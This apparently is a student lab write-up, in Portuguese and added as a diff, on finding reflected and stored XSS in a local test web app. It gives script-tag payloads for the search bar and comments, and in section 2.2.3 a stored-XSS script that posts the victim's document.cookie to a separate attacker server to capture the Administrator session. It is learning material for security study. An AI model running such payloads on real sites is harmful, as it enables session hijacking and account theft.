@@ -1,0 +1,36 @@
+2.2
+        2.2.1
+                "Search for an action that changes the URL. That is, an action that will redirect to the same page but with added variables and content in the URL. If the page behaves diﬀerently based on the URL variables, it is possible that a Reﬂected XSS Attack is present."
+
+                        Por norma este tipo de ataques pode ser realizado utilizando Search Bars. No caso desta app a search bar muda o URL para localhost:6543/search?q=<what u searched>
+                        Tendo agora a vulnerabilidade descoberta podemos na searchbar inserir tags (como <script>) 
+                        Exemplo: Meter na searchbar: <script>alert("Ola :D")</script>
+
+
+        2.2.2
+                "Look for an action that stores a message into the server. For it to be a Server Side Attack, the payload must be included in the web page when the page is built by the server."
+                
+                        Se formos a um post e comentarmos, podemos reparar que o campo do nome está protegido contra tags MAS, a mensagem aceita tags novas (tipo <img> ou <script>) !!
+                                Exemplo: Meter na mensagem: <script>alert("LMAO GOTTEM")</script> , conseguimos inserir novo código no DOM
+
+                                Isto é Server Sided Store Cross Side Scriptiing (Stored XSS) !
+
+
+                "Look for code that loads dynamic content into the webpage using Javascript"
+
+
+        2.2.3
+                Meter na Message dum post:
+                        <script>
+                                $.ajax({
+                                        url: 'http://localhost:8000/cookie',
+                                        type: 'POST',
+                                        data: "username=Administrator;cookie=a"+document.cookie,
+                                })
+                        </script>
+                Usamos o a para que, caso não haja cookie, seja passado sempre um argumento ao hacker_server
+                Com isto conseguimos o cookie da sessao do user Administrador
+
+        
+        2.2.4
+                "Content Security Policy: The page's settings blocked the loading of a resource at http://vulenrable-bank.com/transfer.jsp?amount=1000&to_nib1234500033233 ("img-src")."
